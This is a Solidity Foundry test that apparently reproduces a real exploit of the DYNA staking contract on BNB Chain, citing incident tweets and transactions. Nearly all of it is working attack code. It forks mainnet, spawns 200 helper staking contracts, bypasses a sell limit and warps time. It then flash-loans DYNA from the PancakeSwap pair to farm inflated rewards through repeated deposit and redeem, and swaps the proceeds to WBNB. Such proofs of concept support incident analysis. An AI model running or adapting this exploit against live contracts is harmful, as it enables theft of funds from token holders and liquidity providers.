// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @Analysis
// https://twitter.com/BlockSecTeam/status/1628319536117153794
// https://twitter.com/BeosinAlert/status/1628301635834486784
// @TX
// https://bscscan.com/tx/0x06bbe093d9b84783b8ca92abab5eb8590cb2321285660f9b2a529d665d3f18e4
// https://bscscan.com/tx/0xc09678fec49c643a30fc8e4dec36d0507dae7e9123c270e1f073d335deab6cf0

interface IStakingDYNA {
    function deposit(uint256 _stakeAmount) external;
    function redeem(uint256 _redeemAmount) external;
}

interface IDYNA is IERC20 {
    function _setMaxSoldAmount(uint256 maxvalue) external;
    function _maxSoldAmount() external view returns (uint256);
}

contract StakingReward {
    IERC20 DYNA = IERC20(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);
    IStakingDYNA StakingDYNA = IStakingDYNA(0xa7B5eabC3Ee82c585f5F4ccC26b81c3Bd62Ff3a9);
    address Owner;

    constructor(address owner) {
        Owner = owner;
        DYNA.approve(address(StakingDYNA), type(uint256).max);
    }

    function deposit(uint256 amount) external {
        StakingDYNA.deposit(amount);
    }

    function withdraw(uint256 amount) external {
        StakingDYNA.redeem(amount);
        DYNA.transfer(Owner, DYNA.balanceOf(address(this)));
    }
}

contract ContractTest is Test {
    IDYNA DYNA = IDYNA(0x5c0d0111ffc638802c9EfCcF55934D5C63aB3f79);
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IStakingDYNA StakingDYNA = IStakingDYNA(0xa7B5eabC3Ee82c585f5F4ccC26b81c3Bd62Ff3a9);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xb6148c6fA6Ebdd6e22eF5150c5C3ceE78b24a3a0);
    StakingReward stakingReward;
    StakingReward[] StakingRewardList;
    uint256 flashLoanAmount;
    address DYNAOwner = 0xA8Ff6C807654c5B2B55f188e9a7Ce31C8d192353;

    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 25_879_486);
        cheats.label(address(DYNA), "DYNA");
        cheats.label(address(WBNB), "WBNB");
        cheats.label(address(Router), "Router");
        cheats.label(address(Pair), "Pair");
        cheats.label(address(StakingDYNA), "StakingDYNA");
    }

    function testExploit() external {
        StakingRewardFactory();
        DYNA.transfer(address(Pair), 1); //
        DYNA.transfer(tx.origin, 1e17);
        //
        cheats.startPrank(tx.origin);
        // Bypass Sold Amount Limit
        DYNA.transfer(address(Pair), 1); //
        cheats.stopPrank();
        //
        cheats.warp(block.timestamp + 7 * 24 * 60 * 60);
        // deposit a week ago
        flashLoanAmount = DYNA.balanceOf(address(Pair)) - 3;
        Pair.swap(flashLoanAmount, 0, address(this), new bytes(1));
        DYNAToWBNB();

        emit log_named_decimal_uint("Attacker WBNB balance after exploit", WBNB.balanceOf(address(this)), 18);
    }

    function StakingRewardFactory() internal {
        deal(address(DYNA), address(this), 1001 * 1e18);
        uint256 preStakingRewardAmount = 1000 * 1e18 / 200;
        for (uint256 i; i < 200; ++i) {
            stakingReward = new StakingReward(address(this));
            DYNA.transfer(address(stakingReward), preStakingRewardAmount);
            stakingReward.deposit(preStakingRewardAmount);
            StakingRewardList.push(stakingReward);
        }
    }

    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) external {
        uint256 listLength = StakingRewardList.length;
        for (uint256 i; i < listLength; ++i) {
            uint256 amount = DYNA.balanceOf(address(this));
            DYNA.transfer(address(StakingRewardList[i]), amount);
            StakingRewardList[i].deposit(amount);
            StakingRewardList[i].withdraw(amount);
        }
        DYNA.transfer(address(Pair), flashLoanAmount * 100_000 / 9975 / 9 + 1000);
    }

    function DYNAToWBNB() internal {
        DYNA.transfer(tx.origin, DYNA.balanceOf(address(this)));
        cheats.startPrank(tx.origin);
        DYNA.approve(address(Router), type(uint256).max);
        address[] memory path = new address[](2);
        path[0] = address(DYNA);
        path[1] = address(WBNB);
        Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            DYNA.balanceOf(tx.origin), 0, path, address(this), block.timestamp
        );
        cheats.stopPrank();
    }
}
